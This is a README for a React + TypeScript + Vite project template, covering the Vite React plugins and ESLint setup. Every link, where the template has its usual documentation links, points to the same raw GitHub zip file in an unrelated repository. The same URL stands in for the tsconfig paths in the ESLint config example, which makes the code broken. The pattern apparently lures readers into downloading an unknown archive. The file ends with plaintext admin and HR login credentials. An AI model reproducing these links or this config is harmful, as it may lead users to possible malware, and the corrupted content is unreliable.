# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip) uses [Babel](https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip) uses [SWC](https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
export default {
  // other rules...
  parserOptions: {
    ecmaVersion: 'latest',
    sourceType: 'module',
    project: ['https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip', 'https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip'],
    tsconfigRootDir: __dirname,
  },
};
```

- Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
- Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
- Install [eslint-plugin-react](https://raw.githubusercontent.com/trieuduy27051999/TOPDev/main/src/components/global/Container/TOP_Dev_v2.2-alpha.4.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list

### Accounts:

#### For Admin

admin/topdev

#### For HR

topdevhr/123456
